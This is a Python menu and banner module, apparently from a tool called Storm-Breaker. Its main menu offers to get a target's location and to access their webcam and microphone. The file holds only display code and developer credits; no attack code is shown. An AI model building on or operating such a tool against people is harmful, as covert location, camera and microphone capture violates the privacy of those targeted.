import os,subprocess
from module.colors import c
from time import sleep

#Neofetch
def banner():
    os.system("clear")
    subprocess.Popen('neofetch')
    sleep(1)

#Function for Storm Terminal
def terminal_logo(msg):
        print(c.red+" ┌─["+c.lcyan+"STORM-BREAKER"+c.re+"/"+c.lgreen+msg+c.red+"""]
 └──╼ """+c.re+"$ "+c.pink)

#Function For Main Menu
def show_menu():
    sleep(0.1)
    print(c.red+"\n ["+c.re+"*"+c.red+"]"+c.cyan+" Choose one of the options below \n")
    sleep(0.1)
    print(c.red+" [1]"+c.blue+" Get Location "+c.green+"[Advance Theme]\n")
    sleep(0.1)
    print(c.red+" [2]"+c.blue+" Get Location "+c.purple+"[Smart Phone]\n")
    sleep(0.1)
    print(c.red+" [3]"+c.blue+" Access Webcam\n") 
    sleep(0.1)
    print(c.red+" [4]"+c.blue+" Access Microphone \n")
    sleep(0.1)
    print(c.red+" [5]"+c.blue+" Developer :)\n")
    sleep(0.01)
    print(c.red+" [6]"+c.blue+" Exit . . .\n")

#Function For Developer option list
def Devloper_information():
    os.system("clear")     
    ban= (f"""
{c.grey}                        
                ███████████████████████████████
                ████╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬████
                ██╬╬╬╬╬╬ 🅂🅃🄾🅁🄼 🄱🅁🄴🄰🄺🄴🅁╬╬╬╬╬╬╬██
                █╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬█
                █╬╬╬███████╬╬╬╬╬╬╬╬╬███████╬╬╬█
                █╬╬██╬╬╬╬███╬╬╬╬╬╬╬███╬╬╬╬██╬╬█
                █╬██╬╬╬╬╬╬╬██╬╬╬╬╬██╬╬╬╬╬╬╬██╬█
                █╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬█
                █╬╬╬╬█████╬╬╬╬╬╬╬╬╬╬╬█████╬╬╬╬█
                █╬╬█████████╬╬╬╬╬╬╬█████████╬╬█
                █╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬█
                █╬╬╬╬╬╬╬╬╬╬╬╬╬╬█╬╬╬╬╬╬╬╬╬╬╬╬╬╬█
                █╬╬╬╬╬╬╬╬╬╬╬╬╬╬█╬╬╬╬╬╬╬╬╬╬╬╬╬╬█
                █╬╬╬╬╬╬╬╬╬╬╬╬╬╬█╬╬╬╬╬╬╬╬╬╬╬╬╬╬█
                █╬╬╬▓▓▓▓╬╬╬╬╬╬╬█╬╬╬╬╬╬╬▓▓▓▓╬╬╬█
                █╬╬▓▓▓▓▓▓╬╬█╬╬╬█╬╬╬█╬╬▓▓▓▓▓▓╬╬█
                █╬╬╬▓▓▓▓╬╬██╬╬╬█╬╬╬██╬╬▓▓▓▓╬╬╬█
                █╬╬╬╬╬╬╬╬██╬╬╬╬█╬╬╬╬██╬╬╬╬╬╬╬╬█
                █╬╬╬╬╬████╬╬╬╬███╬╬╬╬████╬╬╬╬╬█
                █╬╬╬╬╬╬╬╬╬╬╬╬╬███╬╬╬╬╬╬╬╬╬╬╬╬╬█
                ██╬╬█╬╬╬╬╬╬╬╬█████╬╬╬╬╬╬╬╬█╬╬██
                ██╬╬██╬╬╬╬╬╬███████╬╬╬╬╬╬██╬╬██
                ██╬╬▓███╬╬╬████╬████╬╬╬███▓╬╬██
                ███╬╬▓▓███████╬╬╬███████▓▓╬╬███
                ███████████████████████████████
                  Ｓｔｏｒｍ Ｂｒｅａｋｅｒ
                                             {c.red}    Version 3.1
                                                            
{c.red}  [*] {c.green}Main Developer  : {c.yellow}Qadir Yolme
{c.red}  [*] {c.green}Debuger : {c.yellow}Hossein Fallah
{c.red}  [*] {c.green}Telegram : {c.yellow}T.me/LooQaat | T.me/Hashivator
{c.red}  [*] {c.green}Github : {c.yellow}Github.com/hashivator || Github.com/inshanecr
    
                   """)
    for Line in ban.split("\n"):
       sleep(0.1)
       print(Line)
    input(c.purple+"\t  -----> Press Enter to Back Main Menu <----- ")
